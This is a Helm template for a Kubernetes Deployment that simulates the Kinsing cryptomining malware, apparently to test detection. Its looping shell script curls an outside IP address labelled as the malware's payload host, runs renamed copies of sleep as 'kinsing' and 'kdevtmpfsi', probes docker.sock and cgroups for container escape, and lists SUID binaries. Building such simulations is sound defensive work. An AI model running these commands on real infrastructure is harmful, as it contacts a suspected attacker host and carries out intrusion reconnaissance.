{{- if .Values.kinsing.enabled -}}
apiVersion: apps/v1
kind: Deployment
metadata:
  name: {{ include "malicious-containers.fullname" . }}-kinsing
  labels:
    {{- include "malicious-containers.labels" . | nindent 4 }}
    app.kubernetes.io/component: kinsing
    kids-label: "1"
spec:
  replicas: 1
  selector:
    matchLabels:
      {{- include "malicious-containers.selectorLabels" . | nindent 6 }}
      app.kubernetes.io/component: kinsing
  template:
    metadata:
      labels:
        {{- include "malicious-containers.selectorLabels" . | nindent 8 }}
        app.kubernetes.io/component: kinsing
        kids-label: "1"
    spec:
      {{- with .Values.nodeSelector }}
      nodeSelector:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      containers:
        - name: kinsing
          image: {{ .Values.kinsing.image }}
          {{- if .Values.kinsing.commandOverride }}
          command: ["/bin/sh", "-c"]
          args:
            - |
              apk add --no-cache curl wget
              echo "Starting Kinsing simulation..."
              while true; do
                echo "[$(date)] curl http://195.3.146.118/kinsing.sh | sh"
                curl -s http://195.3.146.118/kinsing 2>&1 || true
                
                cp /bin/sleep /tmp/kinsing
                chmod +x /tmp/kinsing
                echo "[$(date)] Running /tmp/kinsing..."
                /tmp/kinsing 20 &
                
                echo "[$(date)] Starting cryptominer /tmp/kdevtmpfsi..."
                cp /bin/sleep /tmp/kdevtmpfsi
                chmod +x /tmp/kdevtmpfsi
                /tmp/kdevtmpfsi 15 &
                
                echo "[$(date)] Container escape attempt..."
                cat /proc/self/cgroup 2>/dev/null || true
                ls -la /var/run/docker.sock 2>/dev/null || true
                
                echo "[$(date)] Privilege escalation attempt..."
                find / -perm -4000 2>/dev/null | head -5
                
                wait
                sleep 30
              done
          {{- end }}
{{- end }}
